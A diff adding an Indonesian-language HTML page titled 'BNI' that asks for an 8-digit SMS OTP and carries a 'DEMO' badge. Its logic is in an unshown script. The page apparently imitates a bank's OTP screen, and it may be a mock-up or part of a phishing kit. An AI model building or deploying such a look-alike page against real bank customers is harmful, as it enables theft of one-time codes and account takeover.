@@ -1,0 +1,47 @@
+<html>
+    <head>
+        <title>BNI</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="assets/common/css/global.css">
+        <link rel="stylesheet" href="assets/common/css/otp.css">
+        <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
+        <link rel="stylesheet" href="assets/lib/jquery-ui/jquery-ui.css">
+        <script>
+            const module = {};
+        </script>
+        <script src="assets/common/js/jquery.js"></script>
+        <script type="module" src="assets/common/js/otp.js"></script>
+        <script type="module" src="assets/lib/jquery-ui/jquery-ui.js"></script>
+        <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    </head>
+    <body>
+        <div style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff;">
+            <div style="width: 100%; display: flex; flex-direction: column;">
+                <div class="ripple" style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center;" onclick="module.goBack()">
+                    <ion-icon name="arrow-back" style="color: #888888; font-size: 20px;"></ion-icon>
+                </div>
+                <div style="color: #000000; font-size: 20px; font-weight: bold; margin-left: 20px; margin-right: 20px; margin-top: 10px; align-self: center;">Masukkan OTP</div>
+                <div style="color: #888888; font-size: 15px; margin-left: 20px; margin-right: 20px; margin-top: 10px; align-self: center; text-align: center;">Kami telah mengirim OTP 8 digit melalui SMS ke:</div>
+                <div id="phone" style="color: #5f5a5a; font-size: 18px; font-weight: bold; margin-left: 20px; margin-right: 20px; margin-top: 7px; align-self: center;"></div>
+                <div id="expired-otp" style="color: #ff0000; font-size: 12px; margin-left: 20px; margin-right: 20px; margin-top: 10px; align-self: center; text-align: center; display: none;">Kode OTP tidak valid</div>
+                <div style="width: calc(100% - 60px); height: 55px; border-radius: 5px; background-color: #f6f6f6; margin-left: 20px; margin-right: 20px; margin-top: 30px; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start;">
+                  <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Kode OTP</div>
+                  <input id="otp" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; margin-left: 2px; margin-top: -5px; font-weight: bold; color: #000000;" placeholder="Masukkan kode OTP" type="number" maxlength="10" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
+                </div>
+                <div style="align-self: center; padding-top: 10px; padding-bottom: 10px; margin-left: 20px; margin-right: 20px; margin-top: 15px;" onclick="module.resendOTPCode()">
+                    <div id="resend-text" style="color: #b6d7f8; font-size: 15px; font-weight: bold; text-align: center;"></div>
+                </div>
+                <div class="ripple" style="width: calc(100% - 40px); margin-left: 20px; margin-right: 20px; margin-top: 30px; height: 50px; min-height: 50px; background-color: #017cfb; border-radius: 30px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); display: flex; justify-content: center; align-items: center; color: #ffffff; font-size: 15px; font-weight: bold;" onclick="module.send()">
+                    Lanjutkan
+                </div>
+            </div>
+            <div id="loader" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; display: none; flex-direction: column; justify-content: center; align-items: center;">
+                <div style="width: calc(100% - 40px); height: 200px; border-radius: 10px; background-color: #ffffff; display: flex; justify-content: center; align-items: center;">
+                    <span class="loader"></span>
+                </div>
+            </div>
+            <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px; color: #ffffff; font-size: 20px; font-weight: bold;">DEMO</div>
+        </div>
+    </body>
+</html>
